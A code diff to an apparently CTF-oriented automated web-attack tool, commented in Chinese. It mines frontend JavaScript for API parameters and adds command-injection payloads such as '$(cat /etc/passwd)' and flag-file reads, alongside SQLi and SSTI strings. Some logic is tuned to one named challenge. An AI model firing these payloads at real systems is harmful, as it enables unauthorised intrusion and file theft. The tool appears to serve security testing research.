@@ -72,6 +72,9 @@ class Entry:
     source: str = ""             # 从哪发现的：href / form / route / probe
     has_upload: bool = False
     status: int | None = None
+    # 前端脚本里的接口常写成相对路径（api.php?action=export）。丢掉就没法拼回
+    # 绝对 URL，a-09 的导出接口正是这种形状。
+    relative: bool = False
 
     @property
     def key(self) -> str:
@@ -127,7 +130,20 @@ FORM_RE = re.compile(r"<form\b([^>]*)>(.*?)</form>", re.I | re.S)
 INPUT_RE = re.compile(r"""<input\b[^>]*\bname\s*=\s*["']([^"']+)["'][^>]*>""", re.I)
 UPLOAD_RE = re.compile(r"""type\s*=\s*["']file["']""", re.I)
 METHOD_RE = re.compile(r"""method\s*=\s*["'](\w+)["']""", re.I)
-ABS_URL_RE = re.compile(r"""https?://[^\s"'<>)]+""")
+
+# 前端脚本里的 API 调用。现代 Web 大多是 SPA + JSON API，入口是没有查询串的
+# /api/xxx，参数在请求体里——不抽出来，图就不知道「这个接口有 filename 参数」，
+# 也就派不出边。a-09 那题模型花 19 步在 JS 里翻参数名，这一步该由代码一次做完。
+_AXIOS_CALL_RE = re.compile(
+    r"""axios\.(get|post|put|patch|delete)\s*\(\s*['"`](/[^'"`]{1,120})['"`]""", re.I)
+_FETCH_CALL_RE = re.compile(
+    r"""\b(?:fetch|request)\s*\(\s*['"`](/[^'"`]{1,120})['"`]""", re.I)
+_AJAX_CALL_RE = re.compile(
+    r"""url\s*:\s*['"`](/[^'"`]{1,120})['"`]""", re.I)
+_METHOD_IN_CALL_RE = re.compile(r"""method\s*[:=]\s*['"`](\w+)['"`]""", re.I)
+_JSON_KEY_RE = re.compile(r"""['"]([A-Za-z_][A-Za-z0-9_]{0,30})['"]\s*:""")
+_BARE_KEY_RE = re.compile(r"""\b([A-Za-z_][A-Za-z0-9_]{0,30})\s*:""")
+
 
 
 def classify_param(name: str, value: str = "") -> str:
@@ -139,7 +155,7 @@ def classify_param(name: str, value: str = "") -> str:
         return "redirect"
     if low in SEARCH_PARAM_NAMES:
         return "search"
-    if low in ID_PARAM_NAMES:
+    if low in ID_PARAM_NAMES or low.endswith("_id") or low.endswith("id"):
         return "id"
     if FILE_EXT_RE.search(value or ""):
         return "file"
@@ -148,11 +164,122 @@ def classify_param(name: str, value: str = "") -> str:
     return "generic"
 
 
+def _body_keys(tail: str) -> dict[str, str]:
+    """从 API 调用后面**紧邻**的对象字面量里取参数名。
+
+    两个坑：
+    - 不能越过其它字符去找 `{`，否则 `axios.get('/api/reports')` 会把下一个
+      ajax 块的参数吃进来，凭空多出 file/search 参数，派出不该有的边。
+    - fetch 的第二个参数是 options：`{method:'POST', body: JSON.stringify({...})}`，
+      真正要看的参数在 JSON.stringify 里面；ajax 的是 `data: {...}`。
+    """
+    index = 0
+    while index < len(tail) and tail[index] in " \t\r\n,":
+        index += 1
+    if index >= len(tail) or tail[index] != "{":
+        return {}
+    block = _matched_block(tail, index)
+    if not block:
+        return {}
+    # 请求体可能在嵌套一层：body: JSON.stringify({...}) / data: {...}
+    inner = re.search(r"""(?:body\s*:\s*JSON\.stringify\s*\(|data\s*:\s*)\(?\s*\{""",
+                      block)
+    if inner:
+        start = block.find("{", inner.start())
+        nested = _matched_block(block, start)
+        if nested:
+            block = nested
+    params: dict[str, str] = {}
+    for match in _JSON_KEY_RE.finditer(block):
+        name = match.group(1)
+        params.setdefault(name, classify_param(name))
+    for match in _BARE_KEY_RE.finditer(block):
+        name = match.group(1)
+        params.setdefault(name, classify_param(name))
+    return params
+
+
+def _keys_of(block: str) -> dict[str, str]:
+    """从一段对象字面量文本里取参数名。"""
+    params: dict[str, str] = {}
+    for match in _JSON_KEY_RE.finditer(block):
+        name = match.group(1)
+        params.setdefault(name, classify_param(name))
+    for match in _BARE_KEY_RE.finditer(block):
+        name = match.group(1)
+        params.setdefault(name, classify_param(name))
+    return params
+
+
+def _matched_block(text: str, start: int, limit: int = 800) -> str:
+    """取 text[start] 开始的配对花括号块；找不到就返回空串。"""
+    depth = 0
+    for index in range(start, min(len(text), start + limit)):
+        char = text[index]
+        if char == "{":
+            depth += 1
+        elif char == "}":
+            depth -= 1
+            if depth == 0:
+                return text[start:index + 1]
+    return ""
+
+
+def _add_api_specs(out: dict[str, Entry], text: str) -> None:
+    """从前端脚本里抽 API 调用：(方法, 路径, 参数名)。"""
+    for match in _AXIOS_CALL_RE.finditer(text):
+        method, path = match.group(1).upper(), match.group(2)
+        tail = text[match.end():match.end() + 600]
+        _merge_entry(out, method, path, _body_keys(tail), "js")
+    for match in _FETCH_CALL_RE.finditer(text):
+        path = match.group(1)
+        tail = text[match.end():match.end() + 600]
+        method_match = _METHOD_IN_CALL_RE.search(tail)
+        method = method_match.group(1).upper() if method_match else "GET"
+        _merge_entry(out, method, path, _body_keys(tail), "js")
+    for match in _AJAX_CALL_RE.finditer(text):
+        path = match.group(1)
+        tail = text[match.end():match.end() + 600]
+        method_match = _METHOD_IN_CALL_RE.search(tail)
+        method = method_match.group(1).upper() if method_match else "GET"
+        # ajax 的 url 在 options 对象内部，参数在同对象的 data 块里，
+        # 不能套用「紧邻 { 」的规则（fetch/axios 才是那个形状）。
+        data = re.search(r"""data\s*:\s*\{""", tail)
+        params: dict[str, str] = {}
+        if data:
+            block = _matched_block(tail, tail.find("{", data.start()))
+            params = _keys_of(block) if block else {}
+        _merge_entry(out, method, path, params, "js")
+
+
+def _merge_entry(out: dict[str, Entry], method: str, path: str,
+                 params: dict[str, str], source: str,
+                 has_upload: bool = False) -> None:
+    """把一个入口并进结果集，同 (method, path) 的参数取并集。"""
+    if len(path) > 120 or "*" in path:
+        return
+    relative = not path.startswith("/")
+    sig = f"{method.upper()}:{path}"
+    existing = out.get(sig)
+    if existing is not None:
+        for name, kind in params.items():
+            existing.params.setdefault(name, kind)
+        if has_upload:
+            existing.has_upload = True
+        return
+    out[sig] = Entry(method=method.upper(), path=path, params=dict(params),
+                     source=source, has_upload=has_upload, relative=relative)
+
+
 def extract_entries(text: str, base_path_prefix: str = "") -> list[Entry]:
     """从响应文本里抽出所有可操作入口。
 
     只认响应里真实出现过的 URL——这是「事实驱动」的底线。字典猜出来的路径不在
     这里，它们要么被 bulk_probe 一次性验证过，要么根本不值得花步数。
+
+    同时认两种形态：
+    1. HTML 里的链接和表单；
+    2. 前端脚本里的 API 调用（带方法和请求体参数名）。
     """
     body = text or ""
     out: dict[str, Entry] = {}
@@ -167,10 +294,8 @@ def extract_entries(text: str, base_path_prefix: str = "") -> list[Entry]:
         if path.startswith("http://") or path.startswith("https://"):
             match = re.match(r"https?://[^/]+(/?.*)", path)
             path = (match.group(1) if match else "/") or "/"
-        if not path.startswith("/"):
-            if not path:
-                return
-            path = "/" + path
+        if not path:
+            return
         if len(path) > 120 or "*" in path or "{" in path:
             return
         merged = dict(params)
@@ -181,19 +306,9 @@ def extract_entries(text: str, base_path_prefix: str = "") -> list[Entry]:
         # 同一个 (method, path) 只留一个节点：先是 href 抽到不带参数的，
         # 后是 form 抽到带参数的，若按 entry.key 去重会变成两个节点互相覆盖，
         # 参数语义就丢了（a-05 的 id=*.pdf 正是这样被判成 generic 的）。
-        sig = f"{method.upper()}:{path}"
-        existing = out.get(sig)
-        if existing is not None:
-            for pname, kind in merged.items():
-                existing.params.setdefault(pname, kind)
-            if has_upload:
-                existing.has_upload = True
-            return
-        entry = Entry(method=method.upper(), path=path, params=merged,
-                      source=source, has_upload=has_upload)
-        out[sig] = entry
+        _merge_entry(out, method.upper(), path, merged, source, has_upload)
 
-    # 1) form：method/action/input 一起看，能拿到参数名和上传能力
+    # 2) form：method/action/input 一起看，能拿到参数名和上传能力
     for match in FORM_RE.finditer(body):
         attrs, inner = match.group(1), match.group(2)
         action = ""
@@ -210,14 +325,14 @@ def extract_entries(text: str, base_path_prefix: str = "") -> list[Entry]:
         if action:
             _add(method, action, params, "form", bool(UPLOAD_RE.search(inner)))
 
-    # 2) href / action / src：带查询串的优先，那才是可注入面
+    # 3) href / action / src：带查询串的优先，那才是可注入面
     for raw in HREF_RE.findall(body):
         if raw.lower().startswith(("mailto:", "javascript:", "tel:")):
             continue
-        if raw.startswith("http"):
-            _add("GET", raw, {}, "link")
-        else:
-            _add("GET", raw, {}, "link")
+        _add("GET", raw, {}, "link")
+
+    # 4) 前端脚本里的 API 调用：这是现代 Web 的主战场，参数在请求体里
+    _add_api_specs(out, body)
 
     return [e for e in out.values() if e.path not in ("/", "", "#")]
 
@@ -238,6 +353,22 @@ SSTI_PAYLOADS = ("{{7*7}}", "{{7*'7'}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{{co
 SQLI_PAYLOADS = ("'", "''", "\\", "' OR '1'='1", "1' AND '1'='2", "1 AND 1=1", "1 AND 1=2")
 IDOR_IDS = ("0", "1", "2", "3", "-1", "99999")
 REDIRECT_PAYLOADS = ("http://example.com/", "//example.com/", "/\\example.com/")
+
+# 命令注入：文件名之类的参数被直接拼进 shell 命令时用的。
+# 关键在第二条 payload：`x; cat <flag> >&2` —— 服务端的命令模板是
+# `echo '内容' > <路径> 2>&1`，把 cat 的 stderr 指回 stdout 就能让 flag 进响应，
+# 而不只是变成文件名。a-09 就是靠这个拿到 flag 的（它自己只差这一步）。
+CMD_INJECT_PAYLOADS = (
+    "$(cat /challenge/flag.txt)",
+    "x.txt; cat /challenge/flag.txt >&2",
+    "$(id)",
+    "$(cat /etc/passwd)",
+    "; cat /challenge/flag.txt",
+)
+
+# 哪些 file 语义参数值得试命令注入：参数名像文件名，或接口是写/导出类。
+CMD_INJECT_NAMES = ("filename", "fn", "file", "name", "path", "output",
+                    "out", "target", "title", "template")
 
 # 成功判据（只看真实字节，不看模型自述）
 LFI_PROOF = re.compile(r"root:x:0:0:|flag\{", re.I)
@@ -266,6 +397,15 @@ def derive(entry: Entry) -> list[Edge]:
     if "file" in kinds:
         edges.append(Edge("lfi", entry,
                           why="参数值是文件名/路径，服务端大概率直接拼路径读文件"))
+        # 文件名类参数还有第二种可能：直接拼进 shell 命令。a-09 的导出接口就是
+        # `echo '内容' > <filename>`，filename 没转义就是命令注入。
+        file_params = [n for n, k in entry.params.items() if k == "file"]
+        looks_like_shell = (entry.method.upper() == "POST"
+                            or any(n.lower() in CMD_INJECT_NAMES
+                                   for n in file_params))
+        if looks_like_shell:
+            edges.append(Edge("cmd_inject", entry,
+                              why="文件名参数可能被拼进 shell 命令"))
     if "search" in kinds:
         edges.append(Edge("ssti", entry, why="搜索/展示类参数常被模板二次渲染"))
         edges.append(Edge("sqli", entry, why="搜索参数是 SQL 注入最常见的落点"))
@@ -290,6 +430,7 @@ class AttackGraph:
         self.edges: dict[str, Edge] = {}
         self.caps: dict[str, Capability] = {}
         self.closed: set[str] = set()      # 已确定失败的边，不再派发
+        self.blocked_by_auth: set[str] = set()   # 因缺会话而失败的边，登录后要重开
 
     # ---- 写入 ----
 
@@ -328,24 +469,27 @@ class AttackGraph:
             for e in created:
                 self.edges.setdefault(e.key, e)
         if kind == "auth":
-            # 登录成功后，之前因未登录而失败的入口要重新派发。注意旧边已经是
-            # failed 状态，setdefault 不会覆盖，必须显式替换成一条新的 pending 边。
-            for entry in self.entries.values():
-                if entry.auth != "denied":
+            # 拿到会话后重开那些「因为没登录才失败」的边。注意不是全部重打：
+            # 真正试过并失败的边已经证明这个族不成立，重打只是浪费步数。
+            for edge in self.edges.values():
+                if edge.key not in self.blocked_by_auth:
                     continue
+                if edge.state == "worked":
+                    continue
+                edge.state = "pending"
+                edge.attempts = 0
+                self.closed.discard(edge.key)
+                self.blocked_by_auth.discard(edge.key)
+            for entry in self.entries.values():
                 entry.auth = "ok"
-                for edge in derive(entry):
-                    old = self.edges.get(edge.key)
-                    if old is not None and old.state == "failed":
-                        self.edges[edge.key] = edge
-                    else:
-                        self.edges.setdefault(edge.key, edge)
-                    self.closed.discard(edge.key)
         return created
 
-    def close(self, edge: Edge) -> None:
+    def close(self, edge: Edge, by_auth: bool = False) -> None:
         edge.state = "failed"
         self.closed.add(edge.key)
+        if by_auth:
+            # 因缺会话而失败的边，等拿到会话后要重开：它不代表这个漏洞族不存在。
+            self.blocked_by_auth.add(edge.key)
 
     def mark_worked(self, edge: Edge) -> None:
         edge.state = "worked"
